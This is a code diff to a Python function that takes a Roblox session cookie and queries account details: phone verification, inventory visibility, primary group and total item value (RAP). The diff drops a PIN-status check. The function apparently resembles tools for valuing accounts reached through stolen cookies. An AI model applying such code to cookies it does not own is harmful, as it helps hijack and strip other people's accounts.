@@ -1697,22 +1697,17 @@ async def fetch_roblox_info(cookie):
             phone_info = await r.json()
             phone_verified = phone_info.get("phoneDiscovery", "") == "AllUsers"
 
-        # Step 8: PIN Enabled
-        async with session.get("https://auth.roblox.com/v1/account/pin")  as r:
-            pin_info = await r.json()
-            pin_enabled = pin_info.get("isEnabled", False)
-
-        # Step 9: Can View Inventory
+        # Step 8: Can View Inventory
         async with session.get(f"https://inventory.roblox.com/v1/users/{user_id}/can-view-inventory")  as r:
             inv_info = await r.json()
             inv_public = inv_info.get("canView", False)
 
-        # Step 10: Primary Group
+        # Step 9: Primary Group
         async with session.get(f"https://groups.roblox.com/v1/users/{user_id}/groups/primary/role")  as r:
             group_info = await r.json()
             group = group_info.get("group", None)
 
-        # Step 11: Total RAP
+        # Step 10: Total RAP
         rap = await get_total_rap(user_id, session)
 
         return {
@@ -1725,7 +1720,6 @@ async def fetch_roblox_info(cookie):
             "credit": credit,
             "email_verified": email_verified,
             "phone_verified": phone_verified,
-            "pin_enabled": pin_enabled,
             "inv_public": inv_public,
             "group": group,
             "rap": rap
